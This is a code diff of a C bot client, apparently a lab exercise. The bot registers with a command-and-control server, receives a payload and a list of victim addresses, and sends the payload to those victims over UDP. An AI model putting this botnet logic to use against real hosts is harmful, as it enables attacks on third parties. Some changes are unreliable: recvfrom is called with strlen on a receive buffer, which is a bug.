@@ -84,12 +84,12 @@ void prog(struct msg *message, char *payload){
 	}
 
 	//sends "HELLO\n"
-	int bytes_sent = sendto(sock, data, sizeof(data), 0, udp_server->ai_addr, udp_server->ai_addrlen);
+	int bytes_sent = sendto(sock, data, strlen(data), 0, udp_server->ai_addr, udp_server->ai_addrlen);
 	
 	printf("sent package to the udp_serv\n");
 
 	//waits for the UDP_server to send the payload
-	int bytes_recv = recvfrom(sock, payload, sizeof(payload), 0, NULL, NULL);
+	int bytes_recv = recvfrom(sock, payload, strlen(payload), 0, NULL, NULL);
 
 	printf("%s\n", payload);
 }
@@ -137,7 +137,7 @@ void run(struct msg *message, char *payload){
 				err(3, "getaddrinfo() failed. %s\n", gai_strerror(gai_error));
 			}
 
-			int bytes_sent = sendto(sock, payload, sizeof(payload), 0, target->ai_addr, target->ai_addrlen);
+			int bytes_sent = sendto(sock, payload, strlen(payload), 0, target->ai_addr, target->ai_addrlen);
 		}
 
 		gettimeofday(&tend, NULL);
@@ -184,10 +184,10 @@ int main(int argc, char **argv){
 	}
 
 	//send "REG\n" to C&C server
-	int bytes_sent = sendto(sock, data, sizeof(data), 0, server_address->ai_addr, server_address->ai_addrlen);
+	int bytes_sent = sendto(sock, data, strlen(data), 0, server_address->ai_addr, server_address->ai_addrlen);
 
 	//receive instructions from C&C server
-	int bytes_recv = recvfrom(sock, packet, sizeof(packet), 0, NULL, NULL);
+	int bytes_recv = recvfrom(sock, packet, MESSAGE_MAXLEN, 0, NULL, NULL);
 
 	parse_packet(&message, packet, bytes_recv);
 
@@ -199,8 +199,8 @@ int main(int argc, char **argv){
 	 * and ip addresses and ports of the victim processes
 	 * to which the payload is going to be sent
 	*/
-
-	bytes_recv = recvfrom(sock, packet, sizeof(packet), 0, NULL, NULL);
+	
+	bytes_recv = recvfrom(sock, packet, MESSAGE_MAXLEN, 0, NULL, NULL);
 
 	parse_packet(&message, packet, bytes_recv);
 
@@ -208,7 +208,9 @@ int main(int argc, char **argv){
 		run(&message, payload);
 	}
 
-
+	/* TODO
+	 * Create a while loop to process incoming messages from C&C server
+	 * */
 	freeaddrinfo(server_address);
 	return 0;
 }
